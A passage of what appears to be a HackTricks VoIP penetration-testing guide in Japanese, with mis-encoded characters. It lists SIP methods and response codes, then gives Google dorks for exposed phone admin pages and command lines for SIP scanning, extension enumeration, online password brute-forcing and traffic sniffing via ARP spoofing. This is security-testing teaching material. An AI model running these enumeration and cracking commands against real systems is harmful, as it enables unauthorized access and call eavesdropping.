# VoIPã®ãƒšãƒ³ãƒ†ã‚¹ãƒˆ

<details>

<summary><strong>**htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰**ã§**ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã¶**</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ï¼</strong></summary>

HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•:

- **HackTricksã§ä¼æ¥­ã‚’å®£ä¼ã—ãŸã„**ã¾ãŸã¯**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„**å ´åˆã¯ã€[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
- [**å…¬å¼PEASSï¼†HackTricksã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã™ã‚‹
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª[**NFTs**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’è¦‹ã¤ã‘ã‚‹
- **ğŸ’¬ [Discordã‚°ãƒ«ãƒ¼ãƒ—](https://discord.gg/hRep4RUj7f)**ã«å‚åŠ ã™ã‚‹ã‹ã€[telegramã‚°ãƒ«ãƒ¼ãƒ—](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ã§**ãƒ•ã‚©ãƒ­ãƒ¼**ã™ã‚‹ [**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
- **ãƒãƒƒã‚­ãƒ³ã‚°ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ãŸã‚ã«PRã‚’** [**HackTricks**](https://github.com/carlospolop/hacktricks) **ã¨** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>

## VoIPåŸºæœ¬æƒ…å ±

VoIPã®å‹•ä½œã«ã¤ã„ã¦å­¦ã¶ã«ã¯ã€ä»¥ä¸‹ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„:

{% content-ref url="basic-voip-protocols/" %}
[basic-voip-protocols](basic-voip-protocols/)
{% endcontent-ref %}
```
Request name	Description								RFC references
------------------------------------------------------------------------------------------------------
REGISTER	Register a SIP user.							RFC 3261
INVITE		Initiate a dialog for establishing a call. 				RFC 3261
ACK		Confirm that an entity has received.					RFC 3261
BYE		Signal termination of a dialog and end a call.				RFC 3261
CANCEL		Cancel any pending request.						RFC 3261
UPDATE		Modify the state of a session without changing the state of the dialog.	RFC 3311
REFER		Ask recipient to issue a request for the purpose of call transfer.	RFC 3515
PRACK		Provisional acknowledgement.						RFC 3262
SUBSCRIBE	Initiates a subscription for notification of events from a notifier.	RFC 6665
NOTIFY		Inform a subscriber of notifications of a new event.			RFC 6665
PUBLISH		Publish an event to a notification server.				RFC 3903
MESSAGE		Deliver a text message.	Used in instant messaging applications.		RFC 3428
INFO		Send mid-session information that does not modify the session state.	RFC 6086
OPTIONS		Query the capabilities of an endpoint					RFC 3261
```
## ãƒ¬ã‚¹ãƒãƒ³ã‚¹ã‚³ãƒ¼ãƒ‰

**1xxâ€”ä»®ã®ãƒ¬ã‚¹ãƒãƒ³ã‚¹**
```
100 Trying
180 Ringing
181 Call is Being Forwarded
182 Queued
183 Session Progress
199 Early Dialog Terminated
```
**2xxâ€”æˆåŠŸã—ãŸãƒ¬ã‚¹ãƒãƒ³ã‚¹**
```
200 OK
202 Accepted
204 No Notification
```
**3xxâ€”ãƒªãƒ€ã‚¤ãƒ¬ã‚¯ãƒˆãƒ¬ã‚¹ãƒãƒ³ã‚¹**
```
300 Multiple Choices
301 Moved Permanently
302 Moved Temporarily
305 Use Proxy
380 Alternative Service
```
**4xxâ€”ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆã‚¨ãƒ©ãƒ¼ãƒ¬ã‚¹ãƒãƒ³ã‚¹**
```
400 Bad Request
401 Unauthorized
402 Payment Required
403 Forbidden
404 Not Found
405 Method Not Allowed
406 Not Acceptable
407 Proxy Authentication Required
408 Request Timeout
409 Conflict
410 Gone
411 Length Required
412 Conditional Request Failed
413 Request Entity Too Large
414 Request-URI Too Long
415 Unsupported Media Type
416 Unsupported URI Scheme
417 Unknown Resource-Priority
420 Bad Extension
421 Extension Required
422 Session Interval Too Small
423 Interval Too Brief
424 Bad Location Information
425 Bad Alert Message
428 Use Identity Header
429 Provide Referrer Identity
430 Flow Failed
433 Anonymity Disallowed
436 Bad Identity-Info
437 Unsupported Certificate
438 Invalid Identity Header
439 First Hop Lacks Outbound Support
440 Max-Breadth Exceeded
469 Bad Info Package
470 Consent Needed
480 Temporarily Unavailable
481 Call/Transaction Does Not Exist
482 Loop Detected
483 Too Many Hops
484 Address Incomplete
485 Ambiguous
486 Busy Here
487 Request Terminated
488 Not Acceptable Here
489 Bad Event
491 Request Pending
493 Undecipherable
494 Security Agreement Required
```
**5xxâ€”ã‚µãƒ¼ãƒãƒ¼ã®éšœå®³å¿œç­”**
```
500 Internal Server Error
501 Not Implemented
502 Bad Gateway
503 Service Unavailable
504 Server Time-out
505 Version Not Supported
513 Message Too Large
555 Push Notification Service Not Supported
580 Precondition Failure
```
**6xxâ€”ã‚°ãƒ­ãƒ¼ãƒãƒ«éšœå®³å¿œç­”**
```
600 Busy Everywhere
603 Decline
604 Does Not Exist Anywhere
606 Not Acceptable
607 Unwanted
608 Rejected
```
## VoIP åˆ—æŒ™

### é›»è©±ç•ªå·

Red Team ãŒæœ€åˆã«è¡Œã†ã¹ãã“ã¨ã®1ã¤ã¯ã€OSINT ãƒ„ãƒ¼ãƒ«ã€Google æ¤œç´¢ã€ã¾ãŸã¯ Web ãƒšãƒ¼ã‚¸ã‚’ã‚¹ã‚¯ãƒ¬ã‚¤ãƒ”ãƒ³ã‚°ã—ã¦ä¼æ¥­ã¨é€£çµ¡ã‚’å–ã‚‹ãŸã‚ã®åˆ©ç”¨å¯èƒ½ãªé›»è©±ç•ªå·ã‚’æ¤œç´¢ã™ã‚‹ã“ã¨ã§ã™ã€‚

é›»è©±ç•ªå·ã‚’å–å¾—ã—ãŸã‚‰ã€ã‚ªãƒšãƒ¬ãƒ¼ã‚¿ãƒ¼ã‚’ç‰¹å®šã™ã‚‹ãŸã‚ã«ã‚ªãƒ³ãƒ©ã‚¤ãƒ³ã‚µãƒ¼ãƒ“ã‚¹ã‚’ä½¿ç”¨ã§ãã¾ã™:

- [https://www.numberingplans.com/?page=analysis\&sub=phonenr](https://www.numberingplans.com/?page=analysis\&sub=phonenr)
- [https://mobilenumbertracker.com/](https://mobilenumbertracker.com/)
- [https://www.whitepages.com/](https://www.whitepages.com/)
- [https://www.twilio.com/lookup](https://www.twilio.com/lookup)

ã‚ªãƒšãƒ¬ãƒ¼ã‚¿ãƒ¼ãŒ VoIP ã‚µãƒ¼ãƒ“ã‚¹ã‚’æä¾›ã—ã¦ã„ã‚‹ã‹ã©ã†ã‹ã‚’çŸ¥ã‚‹ã“ã¨ã§ã€ä¼æ¥­ãŒ VoIP ã‚’ä½¿ç”¨ã—ã¦ã„ã‚‹ã‹ã©ã†ã‹ã‚’ç‰¹å®šã§ãã¾ã™... ã•ã‚‰ã«ã€ä¼æ¥­ãŒ VoIP ã‚µãƒ¼ãƒ“ã‚¹ã‚’é›‡ã£ã¦ã„ãªã„å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ãŒã€PSTN ã‚«ãƒ¼ãƒ‰ã‚’ä½¿ç”¨ã—ã¦è‡ªç¤¾ã® VoIP PBX ã‚’å¾“æ¥ã®é›»è©±ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã«æ¥ç¶šã—ã¦ã„ã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚

éŸ³æ¥½ã®è‡ªå‹•å¿œç­”ãªã©ã®ã“ã¨ã¯ã€é€šå¸¸ VoIP ãŒä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹ã“ã¨ã‚’ç¤ºã—ã¦ã„ã¾ã™ã€‚

### Google Dorks
```bash
# Grandstream phones
intitle:"Grandstream Device Configuration" Password
intitle:"Grandstream Device Configuration" (intext:password & intext:"Grandstream Device Configuration" & intext:"Grandstream Networks" | inurl:cgi-bin) -.com|org

# Cisco Callmanager
inurl:"ccmuser/logon.asp"
intitle:"Cisco CallManager User Options Log On" "Please enter your User ID and Password in the spaces provided below and click the Log On button"

# Cisco phones
inurl:"NetworkConfiguration" cisco

# Linksys phones
intitle:"Sipura SPA Configuration"

# Snom phones
intitle:"snom" intext:"Welcome to Your Phone!" inurl:line_login.htm

# Polycom SoundPoint IP & phones
intitle:"SoundPoint IP Configuration Utility - Registration"
"Welcome to Polycom Web Configuration Utility" "Login as" "Password"
intext: "Welcome to Polycom Web Configuration Utility" intitle:"Polycom - Configuration Utility" inurl:"coreConf.htm"
intitle:"Polycom Login" inurl:"/login.html"
intitle:"Polycom Login" -.com

# Elastix
intitle:"Elastix - Login page" intext:"Elastix is licensed under GPL"

# FreePBX
inurl:"maint/index.php?FreePBX" intitle: "FreePBX" intext:"FreePBX Admministration"
```
### OSINTæƒ…å ±

VoIPã‚½ãƒ•ãƒˆã‚¦ã‚§ã‚¢ã®ç‰¹å®šã«å½¹ç«‹ã¤ãã®ä»–ã®OSINTåˆ—æŒ™ã¯ã€Red Teamã«ã¨ã£ã¦æœ‰ç›Šã§ã™ã€‚

### ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯åˆ—æŒ™

- **`nmap`** ã¯UDPã‚µãƒ¼ãƒ“ã‚¹ã‚’ã‚¹ã‚­ãƒ£ãƒ³ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ãŒã€ã‚¹ã‚­ãƒ£ãƒ³ã•ã‚Œã‚‹UDPã‚µãƒ¼ãƒ“ã‚¹ã®æ•°ãŒå¤šã„ãŸã‚ã€ã“ã®ç¨®ã®ã‚µãƒ¼ãƒ“ã‚¹ã§ã¯éå¸¸ã«é…ãã€æ­£ç¢ºã§ãªã„ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚
```bash
sudo nmap --script=sip-methods -sU -p 5060 10.10.0.0/24
```
* **`svmap`** SIPViciousã‹ã‚‰ï¼ˆ`sudo apt install sipvicious`ï¼‰ï¼šæŒ‡å®šã•ã‚ŒãŸãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯å†…ã®SIPã‚µãƒ¼ãƒ“ã‚¹ã‚’ç‰¹å®šã—ã¾ã™ã€‚
* `svmap`ã¯User-Agent `friendly-scanner`ã‚’ä½¿ç”¨ã™ã‚‹ãŸã‚ã€**ç°¡å˜ã«ãƒ–ãƒ­ãƒƒã‚¯**ã§ãã¾ã™ãŒã€`/usr/share/sipvicious/sipvicious`ã‹ã‚‰ã‚³ãƒ¼ãƒ‰ã‚’å¤‰æ›´ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```bash
# Use --fp to fingerprint the services
svmap 10.10.0.0/24 -p 5060-5070 [--fp]
```
* **`SIPPTS scan`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTSã‚¹ã‚­ãƒ£ãƒ³ã¯ã€UDPã€TCPã€ã¾ãŸã¯TLSã‚’ä»‹ã—ãŸSIPã‚µãƒ¼ãƒ“ã‚¹ã®éå¸¸ã«é«˜é€Ÿãªã‚¹ã‚­ãƒ£ãƒŠãƒ¼ã§ã™ã€‚ãƒãƒ«ãƒã‚¹ãƒ¬ãƒƒãƒ‰ã‚’ä½¿ç”¨ã—ã¦ãŠã‚Šã€å¤§è¦æ¨¡ãªãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ç¯„å›²ã‚’ã‚¹ã‚­ãƒ£ãƒ³ã§ãã¾ã™ã€‚ãƒãƒ¼ãƒˆç¯„å›²ã‚’ç°¡å˜ã«æŒ‡å®šã—ãŸã‚Šã€TCPã¨UDPã®ä¸¡æ–¹ã‚’ã‚¹ã‚­ãƒ£ãƒ³ã—ãŸã‚Šã€åˆ¥ã®ãƒ¡ã‚½ãƒƒãƒ‰ã‚’ä½¿ç”¨ã—ãŸã‚Šï¼ˆãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯OPTIONSã‚’ä½¿ç”¨ã—ã¾ã™ï¼‰ã€ç•°ãªã‚‹User-Agentã‚’æŒ‡å®šã—ãŸã‚Šã§ãã¾ã™ã€‚
```bash
sippts scan -i 10.10.0.0/24 -p all -r 5060-5080 -th 200 -ua Cisco [-m REGISTER]

[!] IP/Network: 10.10.0.0/24
[!] Port range: 5060-5080
[!] Protocol: UDP, TCP, TLS
[!] Method to scan: REGISTER
[!] Customized User-Agent: Cisco
[!] Used threads: 200
```
* **metasploit**:  
Metasploitï¼ˆãƒ¡ã‚¿ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆï¼‰:
```
auxiliary/scanner/sip/options_tcp normal  No     SIP Endpoint Scanner (TCP)
auxiliary/scanner/sip/options     normal  No     SIP Endpoint Scanner (UDP)
```
#### è¿½åŠ ã®ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯åˆ—æŒ™

PBXã¯ä»–ã®ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚µãƒ¼ãƒ“ã‚¹ã‚‚å…¬é–‹ã—ã¦ã„ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™:

- **69/UDP (TFTP)**: ãƒ•ã‚¡ãƒ¼ãƒ ã‚¦ã‚§ã‚¢ã®æ›´æ–°
- **80 (HTTP) / 443 (HTTPS)**: ã‚¦ã‚§ãƒ–ã‹ã‚‰ãƒ‡ãƒã‚¤ã‚¹ã‚’ç®¡ç†ã™ã‚‹ãŸã‚
- **389 (LDAP)**: ãƒ¦ãƒ¼ã‚¶ãƒ¼æƒ…å ±ã‚’ä¿å­˜ã™ã‚‹ä»£æ›¿æ‰‹æ®µ
- **3306 (MySQL)**: MySQLãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹
- **5038 (Manager)**: ä»–ã®ãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ ã‹ã‚‰Asteriskã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã‚’å¯èƒ½ã«ã—ã¾ã™
- **5222 (XMPP)**: Jabberã‚’ä½¿ç”¨ã—ãŸãƒ¡ãƒƒã‚»ãƒ¼ã‚¸
- **5432 (PostgreSQL)**: PostgreSQLãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹
- ãã®ä»–...

### ãƒ¡ã‚½ãƒƒãƒ‰ã®åˆ—æŒ™

`SIPPTS enumerate`ã‚’ä½¿ç”¨ã—ã¦ã€PBXã§ä½¿ç”¨å¯èƒ½ãª**ãƒ¡ã‚½ãƒƒãƒ‰ã‚’è¦‹ã¤ã‘ã‚‹**ã“ã¨ãŒã§ãã¾ã™ã€‚[**sippts**](https://github.com/Pepelux/sippts)
```bash
sippts enumerate -i 10.10.0.10
```
### ã‚µãƒ¼ãƒãƒ¼ãƒ¬ã‚¹ãƒãƒ³ã‚¹ã®åˆ†æ

ã‚µãƒ¼ãƒãƒ¼ãŒç§ãŸã¡ã«é€ã‚Šè¿”ã™ãƒ˜ãƒƒãƒ€ãƒ¼ã‚’åˆ†æã™ã‚‹ã“ã¨ã¯éå¸¸ã«é‡è¦ã§ã™ã€‚ç§ãŸã¡ãŒé€ä¿¡ã™ã‚‹ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã®ç¨®é¡ã‚„ãƒ˜ãƒƒãƒ€ãƒ¼ã«å¿œã˜ã¦ã€‚[**sippts**](https://github.com/Pepelux/sippts)ã®`SIPPTS send`ã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€ã™ã¹ã¦ã®ãƒ˜ãƒƒãƒ€ãƒ¼ã‚’æ“ä½œã—ã¦ã‚«ã‚¹ã‚¿ãƒã‚¤ã‚ºã•ã‚ŒãŸãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã‚’é€ä¿¡ã—ã€ãƒ¬ã‚¹ãƒãƒ³ã‚¹ã‚’åˆ†æã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```bash
sippts send -i 10.10.0.10 -m INVITE -ua Grandstream -fu 200 -fn Bob -fd 11.0.0.1 -tu 201 -fn Alice -td 11.0.0.2 -header "Allow-Events: presence" -sdp
```
ä»¥ä¸‹ã¯ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚µãƒ¼ãƒ“ã‚¹ã®ä¾µå…¥ãƒ†ã‚¹ãƒˆã«é–¢ã™ã‚‹ãƒ•ã‚¡ã‚¤ãƒ«network-services-pentesting/pentesting-voip/README.mdã‹ã‚‰ã®ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã§ã™ã€‚ã‚µãƒ¼ãƒãƒ¼ãŒWebsocketsã‚’ä½¿ç”¨ã—ã¦ã„ã‚‹å ´åˆã€ãƒ‡ãƒ¼ã‚¿ã‚’å–å¾—ã™ã‚‹ã“ã¨ã‚‚å¯èƒ½ã§ã™ã€‚[**sippts**](https://github.com/Pepelux/sippts)ã‹ã‚‰`SIPPTS wssend`ã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€å€‹åˆ¥ã®WSãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã‚’é€ä¿¡ã§ãã¾ã™ã€‚
```bash
sippts wssend -i 10.10.0.10 -r 443 -path /ws
```
### æ‹¡å¼µæ©Ÿèƒ½ã®åˆ—æŒ™

PBXï¼ˆãƒ—ãƒ©ã‚¤ãƒ™ãƒ¼ãƒˆãƒ–ãƒ©ãƒ³ãƒäº¤æ›ï¼‰ã‚·ã‚¹ãƒ†ãƒ å†…ã®æ‹¡å¼µæ©Ÿèƒ½ã¯ã€çµ„ç¹”ã‚„ãƒ“ã‚¸ãƒã‚¹å†…ã®å€‹ã€…ã®é›»è©±å›ç·šã€ãƒ‡ãƒã‚¤ã‚¹ã€ã¾ãŸã¯ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«å‰²ã‚Šå½“ã¦ã‚‰ã‚ŒãŸ**ä¸€æ„ã®å†…éƒ¨è­˜åˆ¥å­**ã‚’æŒ‡ã—ã¾ã™ã€‚æ‹¡å¼µæ©Ÿèƒ½ã«ã‚ˆã‚Šã€çµ„ç¹”å†…ã§ã®é€šè©±ã‚’**åŠ¹ç‡çš„ã«ãƒ«ãƒ¼ãƒ†ã‚£ãƒ³ã‚°**ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã¨ãªã‚Šã€å„ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚„ãƒ‡ãƒã‚¤ã‚¹ã«å€‹åˆ¥ã®å¤–éƒ¨é›»è©±ç•ªå·ãŒå¿…è¦ãªããªã‚Šã¾ã™ã€‚

* **`svwar`** from SIPVicious (`sudo apt install sipvicious`): `svwar`ã¯ç„¡æ–™ã®SIP PBXæ‹¡å¼µæ©Ÿèƒ½ãƒ©ã‚¤ãƒ³ã‚¹ã‚­ãƒ£ãƒŠãƒ¼ã§ã™ã€‚æ¦‚å¿µçš„ã«ã¯ã€**ä¸€é€£ã®æ‹¡å¼µæ©Ÿèƒ½ã¾ãŸã¯æŒ‡å®šã•ã‚ŒãŸæ‹¡å¼µæ©Ÿèƒ½ãƒªã‚¹ãƒˆã‚’æ¨æ¸¬**ã™ã‚‹ã“ã¨ã§ã€å¾“æ¥ã®ã‚¦ã‚©ãƒ¼ãƒ€ã‚¤ãƒ¤ãƒ©ãƒ¼ã¨åŒæ§˜ã«æ©Ÿèƒ½ã—ã¾ã™ã€‚
```bash
svwar 10.10.0.10 -p5060 -e100-300 -m REGISTER
```
* **`SIPPTS exten`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS extenã¯SIPã‚µãƒ¼ãƒãƒ¼ä¸Šã®æ‹¡å¼µæ©Ÿèƒ½ã‚’è­˜åˆ¥ã—ã¾ã™ã€‚Sipextenã¯å¤§è¦æ¨¡ãªãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ãŠã‚ˆã³ãƒãƒ¼ãƒˆç¯„å›²ã‚’ãƒã‚§ãƒƒã‚¯ã§ãã¾ã™ã€‚
```bash
sippts exten -i 10.10.0.10 -r 5060 -e 100-200
```
* **metasploit**: Metasploitã‚’ä½¿ç”¨ã—ã¦æ‹¡å¼µå­/ãƒ¦ãƒ¼ã‚¶ãƒ¼åã‚’åˆ—æŒ™ã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ï¼š
```
auxiliary/scanner/sip/enumerator_tcp  normal  No     SIP Username Enumerator (TCP)
auxiliary/scanner/sip/enumerator      normal  No     SIP Username Enumerator (UDP)
```
* **`enumiax` (`apt install enumiax`): enumIAX** ã¯ã€Inter Asterisk Exchange ãƒ—ãƒ­ãƒˆã‚³ãƒ«ã® **ãƒ¦ãƒ¼ã‚¶ãƒ¼åãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹åˆ—æŒ™ãƒ„ãƒ¼ãƒ«** ã§ã™ã€‚enumIAX ã«ã¯ã€2ã¤ã®ç•°ãªã‚‹ãƒ¢ãƒ¼ãƒ‰ã§å‹•ä½œã™ã‚‹ã“ã¨ãŒã‚ã‚Šã¾ã™ã€‚ãã‚Œã¯ã€Sequential Username Guessing ã¾ãŸã¯ Dictionary Attack ã§ã™ã€‚
```bash
enumiax -d /usr/share/wordlists/metasploit/unix_users.txt 10.10.0.10 # Use dictionary
enumiax -v -m3 -M3 10.10.0.10
```
## VoIP æ”»æ’ƒ

### ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹ - ã‚ªãƒ³ãƒ©ã‚¤ãƒ³

**PBX** ã¨ã„ãã¤ã‹ã® **æ‹¡å¼µå­/ãƒ¦ãƒ¼ã‚¶ãƒ¼å** ã‚’ç™ºè¦‹ã—ãŸå¾Œã€Red Team ã¯ä¸€èˆ¬çš„ãªãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã®è¾æ›¸ã‚’ä½¿ç”¨ã—ã¦èªè¨¼ã‚’ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹ã™ã‚‹ãŸã‚ã« **`REGISTER` ãƒ¡ã‚½ãƒƒãƒ‰** ã‚’ä½¿ç”¨ã—ã¦æ‹¡å¼µå­ã«èªè¨¼ã‚’è©¦ã¿ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

{% hint style="danger" %}
**ãƒ¦ãƒ¼ã‚¶ãƒ¼å** ãŒæ‹¡å¼µå­ã¨åŒã˜ã§ã‚ã‚‹å ´åˆãŒã‚ã‚Šã¾ã™ãŒã€ã“ã‚Œã¯ PBX ã‚·ã‚¹ãƒ†ãƒ ã€ãã®æ§‹æˆã€ãŠã‚ˆã³çµ„ç¹”ã®è¨­å®šã«ã‚ˆã£ã¦ç•°ãªã‚‹å ´åˆãŒã‚ã‚Šã¾ã™...

ãƒ¦ãƒ¼ã‚¶ãƒ¼åãŒæ‹¡å¼µå­ã¨ç•°ãªã‚‹å ´åˆã¯ã€**ãƒ¦ãƒ¼ã‚¶ãƒ¼åã‚’ç‰¹å®šã—ã¦ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™**ã€‚
{% endhint %}

* SIPVicious ã® **`svcrack`** (`sudo apt install sipvicious`)ï¼šSVCrack ã¯ PBX ä¸Šã®ç‰¹å®šã®ãƒ¦ãƒ¼ã‚¶ãƒ¼å/æ‹¡å¼µå­ã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’ã‚¯ãƒ©ãƒƒã‚¯ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```bash
svcrack -u100 -d dictionary.txt udp://10.0.0.1:5080 #Crack known username
svcrack -u100 -r1-9999 -z4 10.0.0.1 #Check username in extensions
```
* **`SIPPTS rcrack`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rcrackã¯ã€SIPã‚µãƒ¼ãƒ“ã‚¹ç”¨ã®ãƒªãƒ¢ãƒ¼ãƒˆãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚¯ãƒ©ãƒƒã‚«ãƒ¼ã§ã™ã€‚Rcrackã¯ã€ç•°ãªã‚‹IPã‚¢ãƒ‰ãƒ¬ã‚¹ã¨ãƒãƒ¼ãƒˆç¯„å›²ã®è¤‡æ•°ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’ãƒ†ã‚¹ãƒˆã§ãã¾ã™ã€‚
```bash
sippts rcrack -i 10.10.0.10 -e 100,101,103-105 -w wordlist/rockyou.txt
```
* **Metasploit**:
* [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack.rb)
* [https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack_tcp.rb](https://github.com/jesusprubio/metasploit-sip/blob/master/sipcrack_tcp.rb)

### VoIPã‚¹ãƒ‹ãƒƒãƒ•ã‚£ãƒ³ã‚°

**ã‚ªãƒ¼ãƒ—ãƒ³Wifiãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯**å†…ã§VoIPæ©Ÿå™¨ã‚’è¦‹ã¤ã‘ãŸå ´åˆã€**ã™ã¹ã¦ã®æƒ…å ±ã‚’ã‚¹ãƒ‹ãƒƒãƒ•ã‚£ãƒ³ã‚°**ã§ãã¾ã™ã€‚ã•ã‚‰ã«ã€ã‚ˆã‚Šé–‰ã˜ãŸãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯å†…ã«ã„ã‚‹å ´åˆï¼ˆã‚¤ãƒ¼ã‚µãƒãƒƒãƒˆçµŒç”±ã¾ãŸã¯ä¿è­·ã•ã‚ŒãŸWifiã«æ¥ç¶šã•ã‚Œã¦ã„ã‚‹å ´åˆï¼‰ã€**ARPã‚¹ãƒ—ãƒ¼ãƒ•ã‚£ãƒ³ã‚°**ãªã©ã®**MitMæ”»æ’ƒ**ã‚’å®Ÿè¡Œã—ã¦ã€**PBXã¨ã‚²ãƒ¼ãƒˆã‚¦ã‚§ã‚¤**é–“ã§æƒ…å ±ã‚’ã‚¹ãƒ‹ãƒƒãƒ•ã‚£ãƒ³ã‚°ã§ãã¾ã™ã€‚

ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯æƒ…å ±ã®ä¸­ã«ã¯ã€æ©Ÿå™¨ã‚’ç®¡ç†ã™ã‚‹ãŸã‚ã®**Webè³‡æ ¼æƒ…å ±**ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼**æ‹¡å¼µæ©Ÿèƒ½**ã€**ãƒ¦ãƒ¼ã‚¶ãƒ¼å**ã€**IP**ã‚¢ãƒ‰ãƒ¬ã‚¹ã€ã•ã‚‰ã«ã¯**ãƒãƒƒã‚·ãƒ¥åŒ–ã•ã‚ŒãŸãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰**ã‚„**ä¼šè©±ã‚’èããŸã‚ã«å†ç”Ÿã§ãã‚‹RTPãƒ‘ã‚±ãƒƒãƒˆ**ãªã©ãŒå«ã¾ã‚Œã¦ã„ã¾ã™ã€‚

ã“ã®æƒ…å ±ã‚’å–å¾—ã™ã‚‹ãŸã‚ã«ã¯ã€Wiresharkã€tcpdumpãªã©ã®ãƒ„ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã§ãã¾ã™ãŒã€VoIPä¼šè©±ã‚’ã‚¹ãƒ‹ãƒƒãƒ•ã‚£ãƒ³ã‚°ã™ã‚‹ãŸã‚ã«**ç‰¹åˆ¥ã«ä½œæˆã•ã‚ŒãŸãƒ„ãƒ¼ãƒ«**ã§ã‚ã‚‹[**ucsniff**](https://github.com/Seabreg/ucsniff)ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ã€‚

{% hint style="danger" %}
**SIPé€šä¿¡ã§TLSãŒä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹å ´åˆ**ã€SIPé€šä¿¡ã‚’å¹³æ–‡ã§è¡¨ç¤ºã™ã‚‹ã“ã¨ã¯ã§ãã¾ã›ã‚“ã€‚\
åŒæ§˜ã«ã€**SRTP**ãŠã‚ˆã³**ZRTP**ãŒä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹å ´åˆã€**RTPãƒ‘ã‚±ãƒƒãƒˆã¯å¹³æ–‡ã§ã¯è¡¨ç¤ºã•ã‚Œã¾ã›ã‚“**ã€‚
{% endhint %}

